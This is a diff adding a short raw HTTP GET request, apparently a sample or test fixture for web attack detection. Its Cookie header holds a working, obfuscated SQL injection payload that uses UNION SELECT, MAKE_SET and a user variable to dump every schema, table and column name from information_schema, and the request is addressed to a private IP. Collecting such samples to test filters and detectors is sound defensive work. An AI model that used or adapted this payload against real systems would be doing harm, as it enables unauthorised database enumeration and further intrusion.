@@ -1,0 +1,8 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: WBC-ab04d9=?id=0+Union+Select-1,Make_Set(7,@:=0,(Select-1.From(Information_Schema.Columns)Where@:=Make_Set(63,@,0xa,Table_Schema,Table_Name,Column_Name)),@),1,1
+
